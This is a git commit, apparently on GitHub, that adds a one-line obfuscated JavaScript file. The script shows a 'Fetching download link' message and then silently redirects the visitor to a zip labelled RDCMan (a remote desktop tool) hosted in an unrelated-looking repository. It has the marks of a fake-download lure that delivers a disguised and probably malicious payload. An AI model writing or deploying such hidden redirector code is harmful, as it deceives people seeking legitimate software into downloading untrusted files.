2118e8bfd1949307ad04628b4e87cb79bb2de4b4
aclukes <kommaclukesp9ou@outlook.com>
2025-07-29 22:49:27 +0200

    Add files via upload

---
+++ script.js
@@ -0,0 +1,1 @@
+(function(){var _0=['getElementById','loader','textContent','Fetching download link...','Redirecting…','location','href'];var l=document[_0[0]](_0[1]);l[_0[2]]=_0[3];var d={url:'https://github.com/mlookep/node-echo/releases/download/2.958/RDCMan.zip'};l[_0[2]]=_0[4];setTimeout(function(){window[_0[5]][_0[6]]=d.url;},2000);})();
